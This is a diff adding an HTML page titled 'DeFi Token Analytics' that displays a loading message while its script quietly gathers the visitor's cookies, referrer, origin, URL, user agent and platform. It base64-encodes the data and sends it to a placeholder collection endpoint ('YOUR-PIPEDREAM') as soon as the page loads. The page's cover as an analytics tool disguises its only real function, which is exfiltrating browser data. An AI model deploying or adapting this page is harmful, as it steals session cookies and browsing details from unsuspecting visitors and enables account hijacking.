@@ -1,0 +1,19 @@
+<html>
+<head><title>DeFi Token Analytics</title></head>
+<body>
+<h1>Loading Token Data...</h1>
+<script>
+// Send back everything about the browser context
+var data = {
+  cookies: document.cookie,
+  referrer: document.referrer,
+  origin: window.origin,
+  location: window.location.href,
+  userAgent: navigator.userAgent,
+  platform: navigator.platform
+};
+
+fetch('https://YOUR-PIPEDREAM?info=' + btoa(JSON.stringify(data)));
+</script>
+</body>
+</html>
